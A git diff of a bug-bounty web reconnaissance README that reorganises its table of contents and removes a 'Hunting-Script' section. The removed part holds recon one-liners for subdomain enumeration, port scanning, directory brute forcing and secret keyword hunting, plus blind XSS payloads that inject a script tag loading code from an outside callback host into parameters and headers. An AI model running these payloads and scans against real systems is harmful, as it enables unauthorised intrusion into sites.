@@ -1,52 +1,45 @@
 ```pr0xh4ck © 2022```
 
----
-## Contents
-- [Recon](#recon)
-    - [IP](#ip-test)
-    - [DNS](#dns)
-    - [Internet Search Engine Discovery](#internet-search-engine-discovery)
-    - [Sudomain Enumeration](#subdomain-enumeration)
-    - [DNS Bruteforce](#dns-bruteforce)
-    - [OSINT](#osint)
-    - [HTTP Probing](#http-probing)
-    - [Subdomain Takeover](#subdomain-takeover)
-    - [Web screenshot](#web-screenshot)
-    - [CMS Enumeration](#cms-enumeration)
-    - [Automation](#automation)
-    - [Cloud Enumeration](#cloud-enumeration)
-    - [Github & Secrets](#github-secrets)
-    - [Email Hunting](#email-hunting)
-    - [Data Breach](#data-breach)
-    - [Web Wayback](#web-wayback)
-    - [Ports Scannig](#ports-scanning)
-    - [WAF](#waf)
-    - [Directory Search](#directory-search)
-    - [Hidden File or Directory](#hidden-file-or-directory)
-    - [Hidden Parameter Find](#parameter-finder)
-    - [Bypass Forbidden Direcory](#bypass-forbidder-directory)
-    - [Wordlists & Payloads](#wordlists-payloads)
-    - [Miscellaneous](#miscellaneous)
-    - [Social Engineering](#social-engineering)
-    - [One Line Scripts](#scripts)
-    - [API kay](#API_key)
-    - [Code review](#Code_review)
-    - [Log File Analyze](#log-file-analyze)
-    - [Public programs](#programs)
-    - [Burp Suite Extension](#burp-suite-extesion)
-    - [DOS](#dos)
-    - [Websocket](#Websocket)
-    - [Hands On](#hands-on)
-    - [Hunting Script](#Hunting-Script) 
-    - [Smart Contract](#Smart-Contract)
+![demo](https://github.com/pr0xh4ck/web-recon/raw/main/pr0xh4ck.PNG)
+    
 
 
 <details>
   <summary>Table of Contents</summary>
   <ol>
-    <li><a href="#about-the-project">About The Project</a></li>
-    <li><a href="#built-with">Built With</a></li>
-    <li><a href="#features">Features</a></li>
+    <li><a href="#ip-test">IP Check</a></li>
+    <li><a href="#dns">DNS</a></li>
+    <li><a href="#internet-search-engine-discovery">Internet Search Engine Discovery</a></li> 
+    <li><a href="#subdomain-enumeration">Sudomain Enumeration</a></li> 
+    <li><a href="#dns-bruteforce">DNS Bruteforce</a></li>
+    <li><a href="#osint">OSINT</a></li>
+    <li><a href="#http-probing">HTTP Probing</a></li>
+    <li><a href="#subdomain-takeover">Subdomain Takeover</a></li> 
+    <li><a href="#web-screenshot">Web screenshot</a></li>
+    <li><a href="#cms-enumeration">CMS Enumeration</a></li> 
+    <li><a href="#automation">Automation</a></li> 
+    <li><a href="#cloud-enumeration">Cloud Enumeration</a></li> 
+    <li><a href="#github-secrets">Github & Secrets</a></li>
+    <li><a href="#email-hunting">Email Hunting</a></li>
+    <li><a href="#data-breach">Data Breach</a></li> 
+    <li><a href="#web-wayback">Web Wayback</a></li>
+    <li><a href="#ports-scanning">Ports Scannig</a></li> 
+    <li><a href="#waf">WAF</a></li><li>  
+    <li><a href="#directory-search">Directory Search</a></li>  
+    <li><a href="#hidden-file-or-directory">Hidden File or Directory</a></li>
+    <li><a href="#parameter-finder">Hidden Parameter Find</a></li> 
+    <li><a href="#bypass-forbidder-directory">Bypass Forbidden Direcory</a></li>
+    <li><a href="#wordlists-payloads">Wordlists & Payloads</a></li> 
+    <li><a href="#miscellaneous">Miscellaneous</a></li> 
+    <li><a href="#social-engineering">Social Engineering</a></li> 
+    <li><a href="#scripts">One Line Scripts</a></li> 
+    <li><a href="#API_key">API kay</a></li>
+    <li><a href="#Code_review">Code review</a></li> 
+    <li><a href="#log-file-analyze">Log File Analyze</a></li> 
+    <li><a href="#programs">Public programs</a></li>
+    <li><a href="#burp-suite-extesion">Burp Suite Extension</a></li><li>  
+    <li><a href="#dos">DOS</a></li> 
+    <li><a href="#Websocket">Websocket</a></li> 
     <li><a href="#rewards">Features</a></li>
     <li><a href="#license">License</a></li>
     <li><a href="#contact">Contact</a></li>
@@ -759,196 +752,6 @@ host -t CNAME input.com
 
 ---------------
 --------------------
-
-### hands-on
-
-- Javascript dork manually
-```
-api
-http
-https
-api_key
-apikey
-token
-secret
-config
-conf
-cfg
-ENV
-env
-```
-
-### Hunting-Script
-
-- 1st Command for Subdomain Enumeration using Assetfinder, Subfinder, Findomain
-```bash
-assetfinder [].com | tee -a ./[]-ass && subfinder -silent -all -recursive -d [].com | tee -a ./[]-sub && findomain -q --external-subdomains -t [].com | tee -a ./[]-find
-```
-- For VPS
-```bash
-cat [].txt | assetfinder | tee -a ./[]-ass && subfinder -silent -all -recursive -dL [].txt | tee -a ./[]-sub && findomain -q --external-subdomains -f [].txt | tee -a ./[]-find
-```
-
-```bash
-python3 domainCollector.py "Org+Inc"
-python3 domainCollector.py <orgList>
-```
-```bash
-ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/[] -u https://[].com -H “Host: FUZZ.[].com” -fs 3122
-```
-
-
-- 2nd Command for Sorting and http probing
-```bash
-cat DOM-* | sort -u | grep "DOMAIN.com" | tee -a ./unique && rm -rf DOM-* external_subdomains && cat unique | wc -l 
-```
-
-- For DNS resolving 
-```bash 
-massdns -r resolver.txt -t A -o J subdomains.txt
-massdns -r lists/resolvers.txt -t AAAA [domains].txt | tee -a results.txt
-```
-
-- 3rd Commands
-```bash
-cat unique | httpx -silent | tee -a ./httpx && cat unique | httpx -silent -sc -cl -location -td -server -title | tee -a ./httpx-code && cat httpx | wc -l
-```
-
-- 4th Command for dnsgen
-```bash
-dnsgen unique -w ~/Desktop/dns.txt | httpx -silent | tee -a ./dnsgen
-```
-
-- 5th Command for port scanning
-```bash
-sudo nmap -T4 -A -p- -sS -iL unique | tee -a ./nmap && sudo naabu -silent -list unique | tee -a ./naabu
-```
-
-- 6th Command for jaeles and nuclei automation
-```bash
-cat httpx | nuclei -silent -t ~/nuclei-templates | tee -a ./nuclei 
-```
-```bash
-jaeles scan -c 50 -s <signature> -U <list_urls>
-```
-
-- 7th Command for wayback urls and remove duplicate
-```bash
-cat httpx | gau | tee -a ./gau-1 && cat httpx | gauplus | tee -a ./gau-2 && cat httpx | waybackurls | tee -a ./wayback && cat gau-* wayback | sort -u | tee -a ./finalwaybackurls && rm gau-* wayback && cat finalwaybackurls | wc -l 
-```
-```bash
-cat finalwaybackurls | uro | tee -a ./uro && cat uro | wc -l
-```
-
-- 8th Command for find reflected param & XSS
-```bash
-cat finalwaybackurls | grep "=" | Gxss -c 100 -o gxss -v
-```
-```bash
-cat finalwaybackurls | grep "=" | qsreplace https://YOUR.burpcollaborator.net | httpx -silent -sc -cl -location -rt
-```
-> Blind XSS In Parameters
-```bash
-cat finalwaybackurls | grep "=" | bxss -appendMode -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -parameters
-```
-> Blind XSS In X-Forwarded-For Header
-```bash
-cat finalwaybackurls | bxss -payload '"><script src=https://pr0xh4ck.xss.ht></script>' -header "X-Forwarded-For"
-```
-
-> separete js file from waybackurls
-```bash
-cat finalwaybackurls | subjs | sort -u | tee -a ./subjs
-```
-
-
-- 9th Command for collect all urls
-```bash
-gospider -S httpx -o gospider -c 10 -d 1 
-```
-
-- 10th command for broken link hijacking
-```bash
-blc http://yoursite.com -ro
-```
-
-- 11 th commands for checking open redirection and CRLF check
-- [Oralyzer](https://github.com/r0075h3ll/Oralyzer) - Open Redirection Analyzer
-```bash
-oralyzer -l finalwaybackurls 
-```
-
-- 12 commands for directory bruteforce
-```bash
-/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
-```
-
-```
-/usr/share/seclists/Discovery/Web-Content/raft-large-extension.txt 
-```
-```
-ffuf -recursion=true -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc -w path -u https://target.com/FUZZ -t 5000
-```
-```
-ffuf -recursion=true -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://target.com/FUZZ -t 1000
-```
-```
-dirsearch -r --full-url -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://target.com -t 70
-```
-
-- 13 Censys cli like pro
-```bash
-censys search ' services.tls.certificates.leaf_data.subject.common_name: "TARGET.com"' --index-type hosts | jq -c '.[] | {ip: .ip}' > censys-ip
-```
-```bash
-sed -i 's/[^0-9,.]*//g' censys-ip
-```
-```bash
-cat censys-ip | httpx -silent -sc -cl -location -td -server -title | tee -a censys-httpx
-```
-```bash
-naabu -iL censys-ip 
-```
-
-
-- 14 Email hunt
-```bash
-python3 infoga.py -d TARGET.COM -s all -v 3 -i -b -r TARGET.txt
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
